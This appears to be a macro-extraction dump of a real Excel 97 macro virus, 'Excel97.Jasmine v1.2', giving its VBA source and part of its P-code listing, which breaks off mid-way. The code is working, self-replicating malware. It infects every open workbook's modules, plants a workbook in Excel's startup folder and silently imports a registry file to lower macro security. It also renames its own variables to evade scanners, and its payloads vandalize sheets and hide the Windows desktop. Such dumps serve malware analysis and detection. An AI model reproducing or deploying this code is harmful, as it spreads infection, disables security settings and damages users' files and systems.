  Call Encode(Yp6Kq8Nc9Un5Ib7Tb0Ee2Bg4)
  Rl0Pe9Ut6Ot3Mv9Vl4Th3Aj5 = Yp6Kq8Nc9Un5Ib7Tb0Ee2Bg4.Lines(1, _
   Yp6Kq8Nc9Un5Ib7Tb0Ee2Bg4.CountOfLines)
  GoTo Dj4Rb0Vn7Kv8Uz2Yx3Ym1
 End If
 For j = 1 To Workbooks(i).VBProject.VBComponents.Count
  Set Se3Hs8Xo2Ir2Rq4Kc9 = Workbooks(i).VBProject.VBComponents.Item(j)
  Wb9 = Se3Hs8Xo2Ir2Rq4Kc9.Name
  Set Yp6Kq8Nc9Un5Ib7Tb0Ee2Bg4 = Se3Hs8Xo2Ir2Rq4Kc9.CodeModule
  If InStr(1, Wb9, "Sheet") Then
   If Yp6Kq8Nc9Un5Ib7Tb0Ee2Bg4.Lines(5, 1) = "'Jasmine" Then _
    Call Encode(Yp6Kq8Nc9Un5Ib7Tb0Ee2Bg4)
    Rl0Pe9Ut6Ot3Mv9Vl4Th3Aj5 = Workbooks(i).VBProject.VBComponents _
    .Item(j).CodeModule.Lines(1, Yp6Kq8Nc9Un5Ib7Tb0Ee2Bg4.CountOfLines)
    GoTo Dj4Rb0Vn7Kv8Uz2Yx3Ym1
  End If
 Next
Next
Dj4Rb0Vn7Kv8Uz2Yx3Ym1:
If UCase(Dir(Application.StartupPath + "\Book1.")) <> UCase("BOOK1") Then
 If Yp3Wi1Ex3Iq8Iw1 <> True Then
  Yp3Wi1Ex3Iq8Iw1 = True: Xc4Rc6Nb1Xh7Uc3Yy9 = True
  Workbooks.Add.SaveAs FileName:=Application.StartupPath & "\BOOK1.", FileFormat:=xlNormal, AddToMru:=False
 End If
End If
For i = 1 To Workbooks.Count
 Set Yp6Kq8Nc9Un5Ib7Tb0Ee2Bg4 = Workbooks(i).VBProject.VBComponents.Item("ThisWorkbook").CodeModule
 If Yp6Kq8Nc9Un5Ib7Tb0Ee2Bg4.Lines(5, 1) <> "'Jasmine" Then
  Yp6Kq8Nc9Un5Ib7Tb0Ee2Bg4.InsertLines 1, Rl0Pe9Ut6Ot3Mv9Vl4Th3Aj5
  Yp6Kq8Nc9Un5Ib7Tb0Ee2Bg4.ReplaceLine 6, "Private Sub Workbook_WindowDeactivate(ByVal Wn As Excel.Window)"
 End If
  For ii = 1 To Workbooks(i).VBProject.VBComponents.Count
   Set Se3Hs8Xo2Ir2Rq4Kc9 = Workbooks(i).VBProject.VBComponents.Item(ii)
   Wb9 = Se3Hs8Xo2Ir2Rq4Kc9.Name
   Set Infline = Se3Hs8Xo2Ir2Rq4Kc9.CodeModule
   If Infline.Lines(5, 1) <> "'Jasmine" Then
    If InStr(1, Wb9, "Sheet") Then
     Se3Hs8Xo2Ir2Rq4Kc9.CodeModule.InsertLines 1, Rl0Pe9Ut6Ot3Mv9Vl4Th3Aj5
     Se3Hs8Xo2Ir2Rq4Kc9.CodeModule.ReplaceLine 6, "Private Sub WorkBook_Activate()"
    End If
   End If
  Next
Next
If Xc4Rc6Nb1Xh7Uc3Yy9 = True Then
 Xc4Rc6Nb1Xh7Uc3Yy9 = False
 Workbooks("Book1.").Close savechanges:=True
 Open Eq7Jw1 For Output As 1
 Print #1, "REGEDIT4"
 If Left(Application.Version, 1) = 9 Then
  Print #1, Nu8Ni7Gv0Ov7Xy0Et9Nn7Mc9Pp4Pt9 & "9.0\Excel\Security]"
  Print #1, """Level""=dword:00000001"
 Else
  Print #1, Nu8Ni7Gv0Ov7Xy0Et9Nn7Mc9Pp4Pt9 & "8.0\Excel\Microsoft Excel]"
  Print #1, """Options6""=dword:00000000"
  Print #1, Nu8Ni7Gv0Ov7Xy0Et9Nn7Mc9Pp4Pt9 & "8.0\New User\Settings\Excel\Microsoft Excel]"
  Print #1, """Options6""=dword:00000000"
  Print #1, Nu8Ni7Gv0Ov7Xy0Et9Nn7Mc9Pp4Pt9 & "8.0\Excel\Microsoft Excel]"
  Print #1, """Options6""=dword:00000000"
 End If
 Close 1
 Shell "regedit /s " & Eq7Jw1, vbHide
 Kill Eq7Jw1
End If
If Minute(Now) = Second(Now) Then
 Select Case Day(Now)
  Case 1 To 5 And Int((5 * Rnd) + 1) = 1
   Application.StatusBar = "Excel97.Jasmine v1.2"
  Case 6 To 10 And Int((5 * Rnd) + 1) = 1
   With Assistant.NewBalloon
    .Heading = "Excel97.Jasmine v1.2"
    .Text = "Since the only time I see her near" & vbCr & "Is when I close my eyes" & vbCr & _
            "Should I keep it that way" & vbCr & "The only way I can make her stay..." & vbCr & vbCr
    .Animation = 22
    .Show
   End With
  Case 11 To 20 And Int((5 * Rnd) + 1) = 1
   For i = 1 To 600 Step Int((Rnd * 2) + 1)
    Yx1Kg4De8Bs6Sm1Jd5Ca0 = Chr(65 + Int(Rnd * 26))
    j = Yx1Kg4De8Bs6Sm1Jd5Ca0 & (Int(Rnd * 20) + 1)
    Range(j).Select
    ActiveCell.FormulaR1C1 = "Excel97.Jasmine"
    Range(j).Select
    With Selection.Font
     .Name = "Arial"
     .Size = 10
    End With
    Range(j).Select
    With Selection.Interior
     .ColorIndex = Int((Rnd * 56) + 1)
     .Pattern = xlSolid
    End With
    Columns(Yx1Kg4De8Bs6Sm1Jd5Ca0 & ":" _
     & Yx1Kg4De8Bs6Sm1Jd5Ca0).EntireColumn.AutoFit
    Selection.Font.ColorIndex = Int((Rnd * 56) + 1)
   Next
  Case 21 To 30 And Int((5 * Rnd) + 1) = 1
   System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoDesktop") = 1&
  Case 31 And Int((5 * Rnd) + 1) = 1
   MsgBox "", vbInformation, "Excel97.Jasmine v1.2"
 End Select
End If
End Sub
Private Sub Encode(Loc As Object)
On Error Resume Next
Dim varray(1 To 14) As String
Dim Do0Nw3Ag1Pz6Yk6 As Long: Dim Hm3Uj8Ho8Jx2Ma7Hw2Gg2Bv4Ma1 As Long: Dim Sa4Ym1Ho4Wi0 As Long: Dim Bp0Ah5Ak9Jr3Qa5Yo3Ze6 As Long
varray(1) = "Eq7Jw1": varray(2) = "Yp6Kq8Nc9Un5Ib7Tb0Ee2Bg4": varray(3) = "Rl0Pe9Ut6Ot3Mv9Vl4Th3Aj5": varray(4) = "Se3Hs8Xo2Ir2Rq4Kc9": varray(5) = "Wb9": varray(6) = "Nu8Ni7Gv0Ov7Xy0Et9Nn7Mc9Pp4Pt9": varray(7) = "Yp3Wi1Ex3Iq8Iw1"
varray(8) = "Xc4Rc6Nb1Xh7Uc3Yy9": varray(9) = "Yx1Kg4De8Bs6Sm1Jd5Ca0": varray(10) = "Do0Nw3Ag1Pz6Yk6": varray(11) = "Hm3Uj8Ho8Jx2Ma7Hw2Gg2Bv4Ma1": varray(12) = "Sa4Ym1Ho4Wi0": varray(13) = "Bp0Ah5Ak9Jr3Qa5Yo3Ze6": varray(14) = "Dj4Rb0Vn7Kv8Uz2Yx3Ym1"
Randomize
For i = 1 To 14
 For j = 1 To Int((10 * Rnd) + 1)
  PolyVal = PolyVal + Chr(65 + Int(Rnd * 26)) & Chr(122 - Int(Rnd * 26)) & Chr(48 + Int(Rnd * 10))
 Next
 With Loc
  Do0Nw3Ag1Pz6Yk6 = 1: Hm3Uj8Ho8Jx2Ma7Hw2Gg2Bv4Ma1 = 1: Sa4Ym1Ho4Wi0 = .CountOfLines: Bp0Ah5Ak9Jr3Qa5Yo3Ze6 = Len(.Lines(.CountOfLines, 1))
  Do While .Find(varray(i), Do0Nw3Ag1Pz6Yk6, Hm3Uj8Ho8Jx2Ma7Hw2Gg2Bv4Ma1, Sa4Ym1Ho4Wi0, Bp0Ah5Ak9Jr3Qa5Yo3Ze6, True)
   strVal = .Lines(Do0Nw3Ag1Pz6Yk6, 1)
   strVal = Left(strVal, Hm3Uj8Ho8Jx2Ma7Hw2Gg2Bv4Ma1 - 1) & PolyVal & Mid(strVal, Bp0Ah5Ak9Jr3Qa5Yo3Ze6)
   .ReplaceLine Do0Nw3Ag1Pz6Yk6, strVal
   Do0Nw3Ag1Pz6Yk6 = Sa4Ym1Ho4Wi0 + 1: Hm3Uj8Ho8Jx2Ma7Hw2Gg2Bv4Ma1 = 1
   Sa4Ym1Ho4Wi0 = .CountOfLines: Bp0Ah5Ak9Jr3Qa5Yo3Ze6 = Len(.Lines(.CountOfLines, 1))
  Loop
 End With
 PolyVal = ""
Next
End Sub

-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSExcel.Jasmine.xls
' ===============================================================================
' Module streams:
' _VBA_PROJECT_CUR/VBA/Sheet1 - 10207 bytes
' Line #0:
' 	QuoteRem 0x0000 0x0014 "Excel97.Jasmine v1.2"
' Line #1:
' 	QuoteRem 0x0000 0x001B "Copyright (c) 1999, cry0tek"
' Line #2:
' Line #3:
' 	Dim (Public) 
' 	VarDefn Yp3Wi1Ex3Iq8Iw1
' 	VarDefn Xc4Rc6Nb1Xh7Uc3Yy9 (As Boolean)
' Line #4:
' 	QuoteRem 0x0000 0x0007 "Jasmine"
' Line #5:
' 	FuncDefn (Private Sub WorkBook_Activate())
' Line #6:
' 	OnError (Resume Next) 
' Line #7:
' 	Dim 
' 	VarDefn Yp6Kq8Nc9Un5Ib7Tb0Ee2Bg4 (As Object)
' Line #8:
' 	LitStr 0x000D "c:\remove.reg"
' 	St Eq7Jw1 
' 	BoS 0x0000 
' 	LitStr 0x002D "[HKEY_CURRENT_USER\Software\Microsoft\Office\"
' 	St Nu8Ni7Gv0Ov7Xy0Et9Nn7Mc9Pp4Pt9 
' Line #9:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Workbooks 
' 	MemLd Count 
' 	For 
' Line #10:
' 	SetStmt 
' 	LitStr 0x000C "ThisWorkbook"
' 	Ld i 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	Set Yp6Kq8Nc9Un5Ib7Tb0Ee2Bg4 
' Line #11:
' 	ArgsCall Read 0x0000 
' Line #12:
' 	LitDI2 0x0005 
' 	LitDI2 0x0001 
' 	Ld Yp6Kq8Nc9Un5Ib7Tb0Ee2Bg4 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0008 "'Jasmine"
' 	Eq 
' 	IfBlock 
' Line #13:
' 	Ld Yp6Kq8Nc9Un5Ib7Tb0Ee2Bg4 
' 	ArgsCall (Call) Encode 0x0001 
' Line #14:
' 	LineCont 0x0004 08 00 03 00
' 	LitDI2 0x0001 
' 	Ld Yp6Kq8Nc9Un5Ib7Tb0Ee2Bg4 
' 	MemLd CountOfLines 
' 	Ld Yp6Kq8Nc9Un5Ib7Tb0Ee2Bg4 
' 	ArgsMemLd Lines 0x0002 
' 	St Rl0Pe9Ut6Ot3Mv9Vl4Th3Aj5 
' Line #15:
' 	GoTo Dj4Rb0Vn7Kv8Uz2Yx3Ym1 
' Line #16:
' 	EndIfBlock 
' Line #17:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld i 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #18:
' 	SetStmt 
' 	Ld j 
' 	Ld i 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set Se3Hs8Xo2Ir2Rq4Kc9 
' Line #19:
' 	Ld Se3Hs8Xo2Ir2Rq4Kc9 
' 	MemLd New 
' 	St Wb9 
' Line #20:
' 	SetStmt 
' 	Ld Se3Hs8Xo2Ir2Rq4Kc9 
' 	MemLd CodeModule 
' 	Set Yp6Kq8Nc9Un5Ib7Tb0Ee2Bg4 
' Line #21:
' 	LitDI2 0x0001 
' 	Ld Wb9 
' 	LitStr 0x0005 "Sheet"
' 	FnInStr3 
' 	IfBlock 
' Line #22:
' 	LineCont 0x0004 0C 00 04 00
' 	LitDI2 0x0005 
' 	LitDI2 0x0001 
' 	Ld Yp6Kq8Nc9Un5Ib7Tb0Ee2Bg4 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0008 "'Jasmine"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld Yp6Kq8Nc9Un5Ib7Tb0Ee2Bg4 
' 	ArgsCall (Call) Encode 0x0001 
' 	EndIf 
' Line #23:
' 	LineCont 0x0004 0A 00 04 00
' 	LitDI2 0x0001 
' 	Ld Yp6Kq8Nc9Un5Ib7Tb0Ee2Bg4 
' 	MemLd CountOfLines 
' 	Ld j 
' 	Ld i 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St Rl0Pe9Ut6Ot3Mv9Vl4Th3Aj5 
' Line #24:
' 	GoTo Dj4Rb0Vn7Kv8Uz2Yx3Ym1 
' Line #25:
' 	EndIfBlock 
' Line #26:
' 	StartForVariable 
' 	Next 
' Line #27:
' 	StartForVariable 
' 	Next 
' Line #28:
' 	Label Dj4Rb0Vn7Kv8Uz2Yx3Ym1 
' Line #29:
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitStr 0x0007 "\Book1."
' 	Add 
' 	ArgsLd Dir 0x0001 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0005 "BOOK1"
' 	ArgsLd UCase 0x0001 
' 	Ne 
' 	IfBlock 
' Line #30:
' 	Ld Yp3Wi1Ex3Iq8Iw1 
' 	LitVarSpecial (True)
' 	Ne 
' 	IfBlock 
' Line #31:
' 	LitVarSpecial (True)
' 	St Yp3Wi1Ex3Iq8Iw1 
' 	BoS 0x0000 
' 	LitVarSpecial (True)
' 	St Xc4Rc6Nb1Xh7Uc3Yy9 
' Line #32:
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitStr 0x0007 "\BOOK1."
' 	Concat 
' 	ParamNamed FileName 
' 	Ld xlNormal 
' 	ParamNamed FileFormat 
' 	LitVarSpecial (False)
' 	ParamNamed AddToMru 
' 	Ld Workbooks 
' 	MemLd Add 
' 	ArgsMemCall SaveAs 0x0003 
' Line #33:
' 	EndIfBlock 
' Line #34:
' 	EndIfBlock 
' Line #35:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Workbooks 
' 	MemLd Count 
' 	For 
' Line #36:
' 	SetStmt 
' 	LitStr 0x000C "ThisWorkbook"
' 	Ld i 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	Set Yp6Kq8Nc9Un5Ib7Tb0Ee2Bg4 
' Line #37:
' 	LitDI2 0x0005 
' 	LitDI2 0x0001 
' 	Ld Yp6Kq8Nc9Un5Ib7Tb0Ee2Bg4 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0008 "'Jasmine"
' 	Ne 
' 	IfBlock 
' Line #38:
' 	LitDI2 0x0001 
' 	Ld Rl0Pe9Ut6Ot3Mv9Vl4Th3Aj5 
' 	Ld Yp6Kq8Nc9Un5Ib7Tb0Ee2Bg4 
' 	ArgsMemCall InsertLines 0x0002 
' Line #39:
' 	LitDI2 0x0006 
' 	LitStr 0x003F "Private Sub Workbook_WindowDeactivate(ByVal Wn As Excel.Window)"
' 	Ld Yp6Kq8Nc9Un5Ib7Tb0Ee2Bg4 
' 	ArgsMemCall ReplaceLine 0x0002 
' Line #40:
' 	EndIfBlock 
' Line #41:
' 	StartForVariable 
' 	Ld ii 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld i 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #42:
' 	SetStmt 
' 	Ld ii 
' 	Ld i 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set Se3Hs8Xo2Ir2Rq4Kc9 
' Line #43:
' 	Ld Se3Hs8Xo2Ir2Rq4Kc9 
' 	MemLd New 
' 	St Wb9 
' Line #44:
' 	SetStmt 
' 	Ld Se3Hs8Xo2Ir2Rq4Kc9 
' 	MemLd CodeModule 
' 	Set Infline 
' Line #45:
' 	LitDI2 0x0005 
' 	LitDI2 0x0001 
' 	Ld Infline 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0008 "'Jasmine"
' 	Ne 
' 	IfBlock 
' Line #46:
' 	LitDI2 0x0001 
' 	Ld Wb9 
' 	LitStr 0x0005 "Sheet"
' 	FnInStr3 
' 	IfBlock 
' Line #47:
' 	LitDI2 0x0001 
' 	Ld Rl0Pe9Ut6Ot3Mv9Vl4Th3Aj5 
' 	Ld Se3Hs8Xo2Ir2Rq4Kc9 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #48:
' 	LitDI2 0x0006 
' 	LitStr 0x001F "Private Sub WorkBook_Activate()"
' 	Ld Se3Hs8Xo2Ir2Rq4Kc9 
' 	MemLd CodeModule 
' 	ArgsMemCall ReplaceLine 0x0002 
' Line #49:
' 	EndIfBlock 
' Line #50:
' 	EndIfBlock 
' Line #51:
' 	StartForVariable 
' 	Next 
' Line #52:
' 	StartForVariable 
' 	Next 
' Line #53:
' 	Ld Xc4Rc6Nb1Xh7Uc3Yy9 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #54:
' 	LitVarSpecial (False)
' 	St Xc4Rc6Nb1Xh7Uc3Yy9 
' Line #55:
' 	LitVarSpecial (True)
' 	ParamNamed savechanges 
' 	LitStr 0x0006 "Book1."
' 	ArgsLd Workbooks 0x0001 
' 	ArgsMemCall Close 0x0001 
' Line #56:
' 	Ld Eq7Jw1 
' 	LitDI2 0x0001 
' 	LitDefault 
' 	Open (For Output)
' Line #57:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0008 "REGEDIT4"
' 	PrintItemNL 
' Line #58:
' 	Ld Application 
' 	MemLd Version 
' 	LitDI2 0x0001 
' 	ArgsLd LBound 0x0002 
' 	LitDI2 0x0009 
' 	Eq 
' 	IfBlock 
' Line #59:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld Nu8Ni7Gv0Ov7Xy0Et9Nn7Mc9Pp4Pt9 
' 	LitStr 0x0013 "9.0\Excel\Security]"
' 	Concat 
' 	PrintItemNL 
' Line #60:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0016 ""Level"=dword:00000001"
' 	PrintItemNL 
' Line #61:
' 	ElseBlock 
' Line #62:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld Nu8Ni7Gv0Ov7Xy0Et9Nn7Mc9Pp4Pt9 
' 	LitStr 0x001A "8.0\Excel\Microsoft Excel]"
' 	Concat 
' 	PrintItemNL 
' Line #63:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0019 ""Options6"=dword:00000000"
' 	PrintItemNL 
' Line #64:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld Nu8Ni7Gv0Ov7Xy0Et9Nn7Mc9Pp4Pt9 
' 	LitStr 0x002C "8.0\New User\Settings\Excel\Microsoft Excel]"
' 	Concat 
' 	PrintItemNL 
' Line #65:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0019 ""Options6"=dword:00000000"
' 	PrintItemNL 
' Line #66:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld Nu8Ni7Gv0Ov7Xy0Et9Nn7Mc9Pp4Pt9 
' 	LitStr 0x001A "8.0\Excel\Microsoft Excel]"
' 	Concat 
' 	PrintItemNL 
' Line #67:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0019 ""Options6"=dword:00000000"
' 	PrintItemNL 
' Line #68:
' 	EndIfBlock 
' Line #69:
' 	LitDI2 0x0001 
' 	Close 0x0001 
' Line #70:
' 	LitStr 0x000B "regedit /s "
' 	Ld Eq7Jw1 
' 	Concat 
' 	Ld vbHide 
' 	ArgsCall Shell 0x0002 
' Line #71:
' 	Ld Eq7Jw1 
' 	ArgsCall Kill 0x0001 
' Line #72:
' 	EndIfBlock 
' Line #73:
' 	Ld Now 
' 	ArgsLd Minute 0x0001 
' 	Ld Now 
' 	ArgsLd Second 0x0001 
' 	Eq 
' 	IfBlock 
' Line #74:
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	SelectCase 
' Line #75:
' 	LitDI2 0x0001 
' 	LitDI2 0x0005 
' 	LitDI2 0x0005 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Eq 
' 	And 
' 	CaseTo 
' 	CaseDone 
' Line #76:
' 	LitStr 0x0014 "Excel97.Jasmine v1.2"
' 	Ld Application 
' 	MemSt StatusBar 
' Line #77:
' 	LitDI2 0x0006 
' 	LitDI2 0x000A 
' 	LitDI2 0x0005 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Eq 
' 	And 
' 	CaseTo 
' 	CaseDone 
' Line #78:
' 	StartWithExpr 
' 	Ld Assistant 
' 	MemLd NewBalloon 
' 	With 
' Line #79:
' 	LitStr 0x0014 "Excel97.Jasmine v1.2"
' 	MemStWith Heading 
' Line #80:
' 	LineCont 0x0004 0B 00 0C 00
' 	LitStr 0x0022 "Since the only time I see her near"
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x0017 "Is when I close my eyes"
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x0019 "Should I keep it that way"
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x0023 "The only way I can make her stay..."
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	MemStWith Then 
' Line #81:
' 	LitDI2 0x0016 
' 	MemStWith Animation 
' Line #82:
' 	ArgsMemCallWith Show 0x0000 
' Line #83:
' 	EndWith 
' Line #84:
' 	LitDI2 0x000B 
' 	LitDI2 0x0014 
' 	LitDI2 0x0005 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Eq 
' 	And 
' 	CaseTo 
' 	CaseDone 
' Line #85:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0258 
' 	Ld Rnd 
' 	LitDI2 0x0002 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	ForStep 
' Line #86:
' 	LitDI2 0x0041 
' 	Ld Rnd 
' 	LitDI2 0x001A 
' 	Mul 
' 	FnInt 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	St Yx1Kg4De8Bs6Sm1Jd5Ca0 
' Line #87:
' 	Ld Yx1Kg4De8Bs6Sm1Jd5Ca0 
' 	Ld Rnd 
' 	LitDI2 0x0014 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	Paren 
' 	Concat 
' 	St j 
' Line #88:
' 	Ld j 
' 	ArgsLd Range 0x0001 
' 	ArgsMemCall Set 0x0000 
' Line #89:
' 	LitStr 0x000F "Excel97.Jasmine"
' 	Ld ActiveCell 
' 	MemSt FormulaR1C1 
' Line #90:
' 	Ld j 
' 	ArgsLd Range 0x0001 
' 	ArgsMemCall Set 0x0000 
' Line #91:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Font 
' 	With 
' Line #92:
' 	LitStr 0x0005 "Arial"
' 	MemStWith New 
' Line #93:
' 	LitDI2 0x000A 
' 	MemStWith Size 
' Line #94:
' 	EndWith 
' Line #95:
' 	Ld j 
' 	ArgsLd Range 0x0001 
' 	ArgsMemCall Set 0x0000 
' Line #96:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Interior 
' 	With 
' Line #97:
' 	Ld Rnd 
' 	LitDI2 0x0038 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	MemStWith ColorIndex 
' Line #98:
' 	Ld xlSolid 
' 	MemStWith Pattern 
' Line #99:
' 	EndWith 
' Line #100:
' 	LineCont 0x0004 05 00 05 00
' 	Ld Yx1Kg4De8Bs6Sm1Jd5Ca0 
' 	LitStr 0x0001 ":"
' 	Concat 
' 	Ld Yx1Kg4De8Bs6Sm1Jd5Ca0 
' 	Concat 
' 	ArgsLd Columns 0x0001 
' 	MemLd EntireColumn 
' 	ArgsMemCall AutoFit 0x0000 
' Line #101:
' 	Ld Rnd 
' 	LitDI2 0x0038 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	Ld Selection 
' 	MemLd Font 
' 	MemSt ColorIndex 
' Line #102:
' 	StartForVariable 
' 	Next 
' Line #103:
' 	LitDI2 0x0015 
' 	LitDI2 0x001E 
' 	LitDI2 0x0005 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Eq 
' 	And 
' 	CaseTo 
' 	CaseDone 
' Line #104:
' 	LitDI4 0x0001 0x0000 
' 	LitStr 0x0000 ""
' 	LitStr 0x004D "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"
' 	LitStr 0x0009 "NoDesktop"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #105:
' 	LitDI2 0x001F 
' 	LitDI2 0x0005 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Eq 
' 	And 
' 	Case 
' 	CaseDone 
' Line #106:
' 	LitStr 0x0000 ""
' 	Ld vbInformation 
' 	LitStr 0x0014 "Excel97.Jasmine v1.2"
' 	ArgsCall MsgBox 0x0003 
' Line #107:
' 	EndSelect 
' Line #108:
' 	EndIfBlock 
' Line #109:
' 	EndSub 
' Line #110:
' 	FuncDefn (Private Sub Encode(Loc As Object))
' Line #111:
' 	OnError (Resume Next) 
' Line #112:
' 	Dim 
' 	LitDI2 0x0001 
' 	LitDI2 0x000E 
' 	VarDefn varray (As String)
' Line #113:
' 	Dim 
' 	VarDefn Do0Nw3Ag1Pz6Yk6 (As Long)
' 	BoS 0x0000 
' 	Dim 
' 	VarDefn Hm3Uj8Ho8Jx2Ma7Hw2Gg2Bv4Ma1 (As Long)
' 	BoS 0x0000 
' 	Dim 
' 	VarDefn Sa4Ym1Ho4Wi0 (As Long)
' 	BoS 0x0000 
' 	Dim 
' 	VarDefn Bp0Ah5Ak9Jr3Qa5Yo3Ze6 (As Long)
' Line #114:
' 	LitStr 0x0006 "Eq7Jw1"
' 	LitDI2 0x0001 
' 	ArgsSt varray 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0018 "Yp6Kq8Nc9Un5Ib7Tb0Ee2Bg4"
' 	LitDI2 0x0002 
' 	ArgsSt varray 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0018 "Rl0Pe9Ut6Ot3Mv9Vl4Th3Aj5"
' 	LitDI2 0x0003 
' 	ArgsSt varray 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0012 "Se3Hs8Xo2Ir2Rq4Kc9"
' 	LitDI2 0x0004 
' 	ArgsSt varray 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0003 "Wb9"
' 	LitDI2 0x0005 
' 	ArgsSt varray 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x001E "Nu8Ni7Gv0Ov7Xy0Et9Nn7Mc9Pp4Pt9"
' 	LitDI2 0x0006 
' 	ArgsSt varray 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x000F "Yp3Wi1Ex3Iq8Iw1"
' 	LitDI2 0x0007 
' 	ArgsSt varray 0x0001 
' Line #115:
' 	LitStr 0x0012 "Xc4Rc6Nb1Xh7Uc3Yy9"
' 	LitDI2 0x0008 
' 	ArgsSt varray 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0015 "Yx1Kg4De8Bs6Sm1Jd5Ca0"
' 	LitDI2 0x0009 
' 	ArgsSt varray 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x000F "Do0Nw3Ag1Pz6Yk6"
' 	LitDI2 0x000A 
' 	ArgsSt varray 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x001B "Hm3Uj8Ho8Jx2Ma7Hw2Gg2Bv4Ma1"
' 	LitDI2 0x000B 
' 	ArgsSt varray 0x0001 
